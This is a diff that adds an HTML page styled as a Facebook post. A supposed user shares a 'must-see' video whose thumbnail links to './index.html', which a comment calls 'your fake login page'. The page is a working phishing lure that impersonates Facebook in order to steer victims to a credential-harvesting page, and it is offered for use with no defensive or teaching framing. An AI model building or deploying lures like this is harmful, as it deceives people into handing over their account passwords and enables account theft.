@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 20px; }
+        .post-container {
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.2);
+            max-width: 500px;
+            margin: 40px auto;
+            padding: 15px;
+        }
+        .post-header { display: flex; align-items: center; margin-bottom: 12px; }
+        .profile-pic { width: 40px; height: 40px; border-radius: 50%; margin-right: 10px; }
+        .user-info { font-weight: bold; color: #050505; }
+        .post-text { margin-bottom: 12px; font-size: 16px; }
+        .video-thumbnail { position: relative; cursor: pointer; }
+        .video-thumbnail img { width: 100%; border-radius: 8px; display: block; }
+        .play-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80px;
+            height: 80px;
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.2s;
+        }
+        .play-button:after {
+            content: '';
+            display: block;
+            width: 0;
+            height: 0;
+            border-top: 20px solid transparent;
+            border-bottom: 20px solid transparent;
+            border-left: 30px solid white;
+            margin-left: 5px;
+        }
+        .video-thumbnail:hover .play-button {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+    </style>
+</head>
+<body>
+    <div class="post-container">
+        <div class="post-header">
+            <img src="https://i.imgur.com/Ua5c0xT.png" alt="Profile Picture" class="profile-pic">
+            <span class="user-info">John Smith</span>
+        </div>
+        <p class="post-text">You have to see this video! 😂 Can't believe this actually happened!</p>
+        
+        <!-- THIS IS THE IMPORTANT PART -->
+        <!-- This link points to your fake login page -->
+        <a href="./index.html" class="video-thumbnail">
+            <img src="https://i.imgur.com/sdGgM6E.png" alt="Video Thumbnail">
+            <div class="play-button"></div>
+        </a>
+    </div>
+</body>
+</html>
